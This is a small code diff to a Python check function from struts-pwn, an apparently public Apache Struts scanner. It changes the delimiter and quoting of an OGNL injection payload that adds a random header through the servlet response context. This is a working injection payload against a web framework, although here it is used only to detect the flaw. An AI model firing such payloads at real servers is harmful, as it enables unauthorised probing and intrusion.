@@ -105,7 +105,7 @@ def check(url):
 
     random_string = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(7))
 
-    payload = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']."
+    payload = '${#context[\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"].'
     payload += "addHeader('%s','%s')}.multipart/form-data" % (random_string, random_string)
     headers = {
         'User-Agent': 'struts-pwn (https://github.com/mazen160/struts-pwn)',
